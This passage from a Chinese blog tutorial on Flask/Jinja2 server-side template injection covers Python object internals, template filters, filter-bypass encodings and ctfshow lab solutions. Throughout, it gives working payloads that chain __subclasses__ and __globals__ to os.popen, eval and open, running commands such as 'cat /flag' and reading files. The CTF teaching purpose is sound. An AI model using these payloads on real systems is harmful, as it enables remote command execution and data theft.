id="1-class"><a href="#1-class" class="headerlink" title="1.__class__"></a>1.__class__</h4><p>用来查看变量所属的类,格式为<code>变量.__class__</code></p><p>比如字符串得到的就是<code>&lt;class &#39;str&#39;&gt;</code></p><h4 id="2-bases"><a href="#2-bases" class="headerlink" title="2.__bases__"></a>2.__bases__</h4><p>以元组的形式返回类所直接继承的类。，注意是类的基类，格式为<code>变量.__class__.__bases__</code></p><p>同时也可以加上数组，比如<code>变量.__class__.__bases__[0]</code>来获得第一个基类。</p><p>ps(base是以字符串的形式返回类的基类)</p><h4 id="3-mro"><a href="#3-mro" class="headerlink" title="3.__mro__"></a>3.__mro__</h4><p>返回一个包含对象所继承的基类元组,返回解析方法调用的顺序。</p><h4 id="4-subclasses"><a href="#4-subclasses" class="headerlink" title="4.__subclasses__()"></a>4.__subclasses__()</h4><p>获取类的所有子类，同时也可以在末尾加数组，指定索引值。</p><h4 id="5-init"><a href="#5-init" class="headerlink" title="5.__init__"></a>5.__init__</h4><p>类的初始化，返回为function。便于利用该函数调用globals。</p><h4 id="6-globals"><a href="#6-globals" class="headerlink" title="6.__globals__"></a>6.__globals__</h4><p><code>function.__globals__</code>，用于获取function所处空间下可使用的module、方法以及所有变量。</p><hr><p>以上是常见的一些基本语法内容</p><h3 id="2-类的知识总结"><a href="#2-类的知识总结" class="headerlink" title="2.类的知识总结"></a>2.类的知识总结</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-strong">__class__</span>            类的一个内置属性，表示实例对象的类。<br><span class="hljs-strong">__base__</span>             类型对象的直接基类<br><span class="hljs-strong">__bases__</span>            类型对象的全部基类，以元组形式，类型的实例通常没有属性 <span class="hljs-strong">__bases__</span><br><span class="hljs-strong">__mro__</span>              此属性是由类组成的元组，在方法解析期间会基于它来查找基类。<br><span class="hljs-strong">__subclasses__</span>()     返回这个类的子类集合，<br><span class="hljs-strong">__init__</span>             初始化类，返回的类型是function<br><span class="hljs-strong">__globals__</span>          使用方式是 函数名.<span class="hljs-strong">__globals__</span>获取function所处空间下可使用的module、方法以及所有变量。<br><span class="hljs-strong">__dic__</span>              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的<span class="hljs-strong">__dict__</span>里<br><span class="hljs-strong">__getattribute__</span>()   实例、类、函数都具有的<span class="hljs-strong">__getattribute__</span>魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用<span class="hljs-strong">__getattribute__</span>方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。<br><span class="hljs-strong">__getitem__</span>()        调用字典中的键值，其实就是调用这个魔术方法，比如a[&#x27;b&#x27;]，就是a.<span class="hljs-strong">__getitem__</span>(&#x27;b&#x27;)<br><span class="hljs-strong">__builtins__</span>         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。<span class="hljs-strong">__builtins__</span>与<span class="hljs-strong">__builtin__</span>的区别就不放了，百度都有。<br><span class="hljs-strong">__import__</span>           动态加载类和函数，也就是导入模块，经常用于导入os模块，<span class="hljs-strong">__import__</span>(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()]<br><span class="hljs-strong">__str__</span>()            返回描写这个对象的字符串，可以理解成就是打印出来。<br>url<span class="hljs-emphasis">_for              flask的一个方法，可以用于得到<span class="hljs-strong">__builtins__</span>，而且url_</span>for.<span class="hljs-strong">__globals__</span>[&#x27;<span class="hljs-strong">__builtins__</span>&#x27;]含有current<span class="hljs-emphasis">_app。</span><br><span class="hljs-emphasis">get_</span>flashed<span class="hljs-emphasis">_messages flask的一个方法，可以用于得到<span class="hljs-strong">__builtins__</span>，而且url_</span>for.<span class="hljs-strong">__globals__</span>[&#x27;<span class="hljs-strong">__builtins__</span>&#x27;]含有current<span class="hljs-emphasis">_app。</span><br><span class="hljs-emphasis">lipsum               flask的一个方法，可以用于得到<span class="hljs-strong">__builtins__</span>，而且lipsum.<span class="hljs-strong">__globals__</span>含有os模块：&#123;&#123;lipsum.<span class="hljs-strong">__globals__</span>[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="hljs-emphasis">current_</span>app          应用上下文，一个全局变量。<br><br>request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[&#x27;<span class="hljs-strong">__builtins__</span>&#x27;].open(&#x27;/proc\self\fd/3&#x27;).read()<br>request.args.x1    get传参<br>request.values.x1  所有参数<br>request.cookies      cookies参数<br>request.headers      请求头参数<br>request.form.x1    post传参(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)<br>request.data   post传参(Content-Type:a/b)<br>request.json post传json  (Content-Type: application/json)<br>config               当前application的所有配置。此外，也可以这样&#123;&#123; config.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read() &#125;&#125;<br>g                    &#123;&#123;g&#125;&#125;得到<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">flask.g</span> <span class="hljs-attr">of</span> &#x27;<span class="hljs-attr">flask_ssti</span>&#x27;&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="3-常见过滤器"><a href="#3-常见过滤器" class="headerlink" title="3.常见过滤器"></a>3.常见过滤器</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs markdown">常用的过滤器<br>int()：将值转换为int类型；<br>float()：将值转换为float类型；<br>lower()：将字符串转换为小写；<br>upper()：将字符串转换为大写；<br>title()：把值中的每个单词的首字母都转成大写<br>capitalize()：把变量值的首字母转成大写，其余字母转小写；<br>trim()：截取字符串前面和后面的空白字符；<br>wordcount()：计算一个长字符串中单词的个数；<br>reverse()：字符串反转；<br>replace(value,old,new)： 替换将old替换为new的字符串；<br>truncate(value,length=255,killwords=False)：截取length长度的字符串；<br>striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；<br>escape()或e：转义字符，会将&lt;、&gt;等符号转义成HTML中的符号。显例：content|escape或content|e。<br>safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： &#123;&#123;&#x27;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">em</span>&gt;</span></span>hello<span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">em</span>&gt;</span></span>&#x27;|safe&#125;&#125;；<br>list()：将变量列成列表；<br>string()：将变量转换成字符串；<br>join()：将一个序列中的参数值拼接成字符串。示例看上面payload；<br>abs()：返回一个数值的绝对值；<br>first()：返回一个序列的第一个元素；<br>last()：返回一个序列的最后一个元素；<br>format(value,arags,<span class="hljs-emphasis">*kwargs)：格式化字符串。比如：&#123;&#123; &quot;%s&quot; - &quot;%s&quot;|format(&#x27;Hello?&#x27;,&quot;Foo!&quot;) &#125;&#125;将输出：Helloo? - Foo!</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">length()：返回一个序列或者字典的长度；</span><br><span class="hljs-emphasis">sum()：返回列表内数值的和；</span><br><span class="hljs-emphasis">sort()：返回排序后的列表；</span><br><span class="hljs-emphasis">default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default(&#x27;xiaotuo&#x27;)----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。</span><br><span class="hljs-emphasis">length()返回字符串的长度，别名是count</span><br></code></pre></td></tr></table></figure><p>对于2.3两个是直接进行转载便于自身本地的及时查找。</p><h2 id="三、进阶知识"><a href="#三、进阶知识" class="headerlink" title="三、进阶知识"></a>三、进阶知识</h2><h3 id="1-模板语法"><a href="#1-模板语法" class="headerlink" title="1.模板语法"></a>1.模板语法</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&#123;%...%&#125;可以进行声明变量，也可以进行循环语句和条件语句<br><br>&#123;&#123;...&#125;&#125;将表达式打印到模板输出<br><br>&#123;#...#&#125;表示未包含在模板输出中的注释<br><br><span class="hljs-section">##可以有和&#123;%%&#125;相同的效果</span><br></code></pre></td></tr></table></figure><h3 id="2-变量"><a href="#2-变量" class="headerlink" title="2.变量"></a>2.变量</h3><p>标准的python语法使用点<code>（.）</code>外，还可以使用中括号<code>（[]）</code>来访问变量的属性。也就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;<span class="hljs-string">&quot;&quot;</span>.__class__&#125;&#125;<br>&#123;&#123;<span class="hljs-string">&quot;&quot;</span>[<span class="hljs-string">&#x27;__classs__&#x27;</span>]&#125;&#125;<br></code></pre></td></tr></table></figure><p>You can use a dot (.) to access attributes of a variable in addition to the standard Python <strong>getitem</strong> “subscript” syntax ([]). –官方原文</p><p>这里就是介绍了如果禁用点可以用中括号，而实际就是调用了getitem这个函数，对于取键值也可以调用这个函数</p><hr><p>除此之外，除了调用，也可以用自带的一些办法，比如说pop</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">pop(key[,default])<br>参数<br>key: 要删除的键值<br>default: 如果没有 key，返回 default 值<br>删除字典给定键 key 所对应的值，返回值为被删除的值。key值必须给出。 否则，返回default值。<br></code></pre></td></tr></table></figure><p>也可以用<code>list.pop(&quot;var&quot;)</code>,建议不要使用，可能删除导致服务器崩坏。</p><p>同时也可以尝试以下两种的情况</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">dict.get(key, default=None)<br>返回指定键的值，如果值不在字典中返回default值<br><br>dict.setdefault(key, default=None)<br>和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default<br></code></pre></td></tr></table></figure><hr><p>调用变量的实际情况，应该如</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&quot;&quot;.<span class="hljs-strong">__class__</span><br>&quot;&quot;.<span class="hljs-strong">__getattribute__</span>(&quot;<span class="hljs-strong">__class__</span>&quot;)<br></code></pre></td></tr></table></figure><p>如果出现了一些过滤，也可以进行简单的绕过</p><h3 id="3-绕过"><a href="#3-绕过" class="headerlink" title="3.绕过"></a>3.绕过</h3><h4 id="1-拼接"><a href="#1-拼接" class="headerlink" title="1.拼接"></a>1.拼接</h4><p>“cla”+”ss”</p><p>实际测试的时候，jinjia2默认<code>&quot;cla&quot;&quot;ss&quot;</code>是等同于<code>&quot;class&quot;</code>的，所以也不必加+。</p><h4 id="2-反转"><a href="#2-反转" class="headerlink" title="2.反转"></a>2.反转</h4><p>“<strong>ssalc</strong>“[::-1]</p><h4 id="3-ascii绕过"><a href="#3-ascii绕过" class="headerlink" title="3.ascii绕过"></a>3.ascii绕过</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 将97转换为对应的字符&#x27;a&#x27;</span><br>char_a = <span class="hljs-string">&quot;&#123;0:c&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">97</span>)<br><span class="hljs-built_in">print</span>(char_a)  <span class="hljs-comment"># 输出: &#x27;a&#x27;</span><br><span class="hljs-comment"># 将多个整数转换为对应的字符并组合成字符串&#x27;__class__&#x27;</span><br>formatted_string = <span class="hljs-string">&quot;&#123;0:c&#125;&#123;1:c&#125;&#123;2:c&#125;&#123;3:c&#125;&#123;4:c&#125;&#123;5:c&#125;&#123;6:c&#125;&#123;7:c&#125;&#123;8:c&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-number">95</span>, <span class="hljs-number">95</span>, <span class="hljs-number">99</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">115</span>, <span class="hljs-number">115</span>, <span class="hljs-number">95</span>, <span class="hljs-number">95</span>)<br><span class="hljs-built_in">print</span>(formatted_string)  <span class="hljs-comment"># 输出: &#x27;__class__&#x27;</span><br></code></pre></td></tr></table></figure><p>前面的{0:c}是占位符，类比下去对应后面的内容。</p><h4 id="4-编码绕过"><a href="#4-编码绕过" class="headerlink" title="4.编码绕过"></a>4.编码绕过</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 直接字符表示</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;__class__&quot;</span>)<br><br><span class="hljs-comment"># 转义字符表示</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>)<br><span class="hljs-comment">#十六进制转义</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&quot;</span>)<br><span class="hljs-comment">#十六进制加ascii转义</span><br><span class="hljs-comment"># 对于python2也可以Base64 编码和解码</span><br>encoded_str = <span class="hljs-string">&quot;X19jbGFzc19f&quot;</span><br>decoded_str = encoded_str.decode(<span class="hljs-string">&quot;base64&quot;</span>)<br><span class="hljs-built_in">print</span>(decoded_str)  <span class="hljs-comment"># 输出: &#x27;__class__&#x27;</span><br></code></pre></td></tr></table></figure><h4 id="5-利用chr函数"><a href="#5-利用chr函数" class="headerlink" title="5.利用chr函数"></a>5.利用chr函数</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;% <span class="hljs-built_in">set</span> <span class="hljs-built_in">chr</span>=url_for.__globals__[<span class="hljs-string">&#x27;__builtins__&#x27;</span>].<span class="hljs-built_in">chr</span> %&#125;<br><span class="hljs-comment">#这里使用了 Jinja2 模板中的 set 语句，将 chr 函数赋值给一个模板变量 chr。</span><br><span class="hljs-comment">#chr函数将数字转化为字符</span><br>&#123;&#123;<span class="hljs-string">&quot;&quot;</span>[<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)%2bchr(<span class="hljs-number">95</span>)%2bchr(<span class="hljs-number">99</span>)%2bchr(<span class="hljs-number">108</span>)%2bchr(<span class="hljs-number">97</span>)%2bchr(<span class="hljs-number">115</span>)%2bchr(<span class="hljs-number">115</span>)%2bchr(<span class="hljs-number">95</span>)%2bchr(<span class="hljs-number">95</span>)]&#125;&#125;<br><span class="hljs-comment">#最终显示的也是__class__</span><br></code></pre></td></tr></table></figure><h4 id="6-利用-拼接"><a href="#6-利用-拼接" class="headerlink" title="6.利用~拼接"></a>6.利用~拼接</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;%<span class="hljs-built_in">set</span> a=<span class="hljs-string">&#x27;__cla&#x27;</span> %&#125;&#123;%<span class="hljs-built_in">set</span> b=<span class="hljs-string">&#x27;ss__&#x27;</span>%&#125;&#123;&#123;<span class="hljs-string">&quot;&quot;</span>[a~b]&#125;&#125;<br></code></pre></td></tr></table></figure><h4 id="7-大小写绕过"><a href="#7-大小写绕过" class="headerlink" title="7.大小写绕过"></a>7.大小写绕过</h4><p>前提是只过滤大写或者小写，比如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;</span>[<span class="hljs-string">&quot;__CLASS__&quot;</span>.lower()]<br></code></pre></td></tr></table></figure><h3 id="4-过滤器"><a href="#4-过滤器" class="headerlink" title="4.过滤器"></a>4.过滤器</h3><p>这部分内容上面都有一个表，主要跟着详细介绍一下</p><h4 id="1-attr"><a href="#1-attr" class="headerlink" title="1.attr"></a>1.attr</h4><p>用于动态访问对象的属性，即访问管道符前面的内容</p><p>常用于.和[]被过滤的情况，比如</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&quot;&quot;|attr(&quot;<span class="hljs-strong">__class__</span>&quot;)<br>相当于<br>&quot;&quot;.<span class="hljs-strong">__class__</span><br></code></pre></td></tr></table></figure><p>返回的就是str</p><h4 id="2-format"><a href="#2-format" class="headerlink" title="2.format"></a>2.format</h4><p>功能可以参考ascii的绕过，直接放案例了</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)==&#x27;<span class="hljs-strong">__class__</span>&#x27;<br>&quot;&quot;[&quot;%c%c%c%c%c%c%c%c%c&quot;|format(95,95,99,108,97,115,115,95,95)]<br></code></pre></td></tr></table></figure><h4 id="3-first-last-random"><a href="#3-first-last-random" class="headerlink" title="3.first ,last, random"></a>3.first ,last, random</h4><p>返回第一个最后一个或者随机，随机可以写脚本爆破，举个例子，如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__|last()<br>相当于<br><span class="hljs-string">&quot;&quot;</span>.__class__.__mro__[-<span class="hljs-number">1</span>]<br></code></pre></td></tr></table></figure><h4 id="4-join"><a href="#4-join" class="headerlink" title="4.join"></a>4.join</h4><p>我个人认为就是用于拼接的，直接上例子，如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;</span>[[<span class="hljs-string">&#x27;__clas&#x27;</span>,<span class="hljs-string">&#x27;s__&#x27;</span>]|join] 或者 <span class="hljs-string">&quot;&quot;</span>[(<span class="hljs-string">&#x27;__clas&#x27;</span>,<span class="hljs-string">&#x27;s__&#x27;</span>)|join]<br>相当于<br><span class="hljs-string">&quot;&quot;</span>[<span class="hljs-string">&quot;__class__&quot;</span>]<br></code></pre></td></tr></table></figure><h4 id="5-select和string"><a href="#5-select和string" class="headerlink" title="5.select和string"></a>5.select和string</h4><p>顾名思义选择和转化为字符，先选择字符串的内容，再转化为字母，可以构造拼接__class__</p><h2 id="四、靶场练习"><a href="#四、靶场练习" class="headerlink" title="四、靶场练习"></a>四、靶场练习</h2><h4 id="知识点-利用链"><a href="#知识点-利用链" class="headerlink" title="知识点:利用链"></a>知识点:利用链</h4><p>注意因python2,3以及版本的原因，是有部分差异的</p><p><strong>1.os._wrap_close</strong> 类popen,比如下面</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">&quot;&quot;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__bases__</span>[<span class="hljs-string">0</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">134</span>].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-link">&#x27;whoami&#x27;</span>).read()<br></code></pre></td></tr></table></figure><p><strong>2.os直接使用</strong></p><p><strong>3.__import__下的os</strong></p><p>种类还有很多，可以自己多加尝试总结。</p><p><strong>4.flask内置</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs markdown">Flask内置函数和内置对象可以通过&#123;&#123;self.<span class="hljs-strong">__dict__</span>.<span class="hljs-emphasis">_TemplateReference<span class="hljs-strong">__context.keys()&#125;&#125;查看，然后可以查看一下这几个东西的类型，类可以通过__</span>init<span class="hljs-strong">__方法跳到os，函数直接用__</span>globals<span class="hljs-strong">__方法跳到os。（payload一下子就简洁了）</span></span><br><span class="hljs-strong"><span class="hljs-emphasis"></span></span><br><span class="hljs-strong"><span class="hljs-emphasis">&#123;&#123;self.__</span>dict<span class="hljs-strong">__._TemplateReference__</span>context.keys()&#125;&#125;</span><br><span class="hljs-emphasis">#查看内置函数</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">#函数：lipsum、url_</span>for、get<span class="hljs-emphasis">_flashed_</span>messages<br><span class="hljs-section">#类：cycler、joiner、namespace、config、request、session</span><br>&#123;&#123;lipsum.<span class="hljs-strong">__globals__</span>.os.popen(&#x27;ls&#x27;).read()&#125;&#125;<br><span class="hljs-section">#函数</span><br>&#123;&#123;cycler.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>.os.popen(&#x27;ls&#x27;).read()&#125;&#125;<br><span class="hljs-section">#类</span><br></code></pre></td></tr></table></figure><p><strong>5.通过getshell</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs markdown">原理就是找到含有 <span class="hljs-strong">__builtins__</span> 的类，然后利用<br><br>&#123;% for c in [].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>() %&#125;&#123;% if c.<span class="hljs-strong">__name__</span>==&#x27;catch<span class="hljs-emphasis">_warnings&#x27; %&#125;&#123;&#123; c.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[&#x27;<span class="hljs-strong">__builtins__</span>&#x27;].eval(&quot;<span class="hljs-strong">__import__</span>(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="hljs-emphasis">#读写文件</span><br><span class="hljs-emphasis">&#123;% for c in [].<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__base__</span>.<span class="hljs-strong">__subclasses__</span>() %&#125;&#123;% if c.<span class="hljs-strong">__name__</span>==&#x27;catch_</span>warnings&#x27; %&#125;&#123;&#123; c.<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[&#x27;<span class="hljs-strong">__builtins__</span>&#x27;].open(&#x27;filename&#x27;, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure><h3 id="1-ctfshow-361"><a href="#1-ctfshow-361" class="headerlink" title="1.ctfshow 361"></a>1.ctfshow 361</h3><p>尝试一下**?name&#x3D;49**,发现是模板注入，输出是49</p><p>接着常规思路</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;&#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%96%87%E7%AB%A0/ssti/361-1.png" alt="361-1"></p><p>继续找子类,搜索os</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;&#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[1].<span class="hljs-strong">__subclasses__</span>()&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%96%87%E7%AB%A0/ssti/361-2.png" alt="361-2"></p><p>利用这里面的popen得到flag</p><p>因为每个环境使用的python库不同 所以类的排序有差异，本地并不一定是132，比如我用的3.9本地测的是134,自己找脚本跑一下就得到132了</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;&#x27;&#x27;.<span class="hljs-strong">__class__</span>.<span class="hljs-strong">__mro__</span>[<span class="hljs-string">1</span>].<span class="hljs-strong">__subclasses__</span>()[<span class="hljs-string">132</span>].<span class="hljs-strong">__init__</span>.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-link">&#x27;tac /????&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%96%87%E7%AB%A0/ssti/361-3.png" alt="361-3"></p><p>也可以用控制块来</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;% print(url<span class="hljs-emphasis">_for.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-symbol">&#x27;eval&#x27;</span>](&quot;<span class="hljs-strong">__import__</span>(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;))%&#125;</span><br></code></pre></td></tr></table></figure><h3 id="2-ctfshow-362"><a href="#2-ctfshow-362" class="headerlink" title="2.ctfshow 362"></a>2.ctfshow 362</h3><p>正常的思路先测一下是否是模板注入</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;1-1&#125;&#125;<br></code></pre></td></tr></table></figure><p>发现是正确的，然后测看看子类，也是可以进行的</p><p>但是最后发现应该把<strong>数字过滤</strong>了，那就试试另外一种吧</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;% print(url<span class="hljs-emphasis">_for.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-symbol">&#x27;eval&#x27;</span>](&quot;<span class="hljs-strong">__import__</span>(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()&quot;))%&#125;</span><br></code></pre></td></tr></table></figure><p>这种还是可以直接写出来的</p><p>另外一种解法就是通过全角数字的解法得到答案</p><h3 id="3-ctfshow-363"><a href="#3-ctfshow-363" class="headerlink" title="3.ctfshow 363"></a>3.ctfshow 363</h3><p>这题在此基础上<strong>过滤了引号</strong>，由此并不能直接用上面的方法，我尝试调用os.__class__.close并且用全角符号进行绕过,并且运用request.args.来间接调用发现好像并不能执行，因此，借鉴一下得到了一种解法</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;&#123;url<span class="hljs-emphasis">_for.<span class="hljs-strong">__globals__</span>[<span class="hljs-string">request.args.a</span>][<span class="hljs-symbol">request.args.b</span>](request.args.c).read()&#125;&#125;&amp;a=os&amp;b=popen&amp;c=cat /flag</span><br></code></pre></td></tr></table></figure><p>request.args用于获取 URL 中的查询参数如果有就返回如果没有将引发异常，这里后面的输入就可以得到答案了。</p><p>config.__str__[2]就是o可以拼接os,但是字母不够，仅仅是一种思路</p><p>此外还有一种利用chr的方式,也是可以的</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">?name=&#123;% set chr=url<span class="hljs-emphasis">_for.<span class="hljs-strong">__globals__</span>.<span class="hljs-strong">__builtins__</span>.chr %&#125;&#123;% print url_</span>for.<span class="hljs-strong">__globals__</span>[chr(111)%2bchr(115)]%&#125;<br></code></pre></td></tr></table></figure><h3 